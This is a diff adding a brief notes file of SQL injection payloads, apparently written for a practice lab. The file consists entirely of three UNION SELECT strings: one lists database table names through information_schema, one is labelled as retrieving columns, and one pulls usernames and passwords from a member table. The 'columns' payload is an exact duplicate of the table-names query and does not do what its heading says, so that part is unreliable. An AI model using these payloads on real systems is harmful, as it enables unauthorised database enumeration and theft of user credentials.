@@ -1,0 +1,11 @@
+For table names:
+
+0 OR 1 = 1 UNION SELECT table_schema, table_name FROM information_schema.TABLES
+
+For table columns:
+
+0 OR 1 = 1 UNION SELECT table_schema, table_name FROM information_schema.TABLES
+
+For usernames and passwords:
+
+0 OR 1 = 2 UNION SELECT username, password FROM Member_Brute_Force.db_default
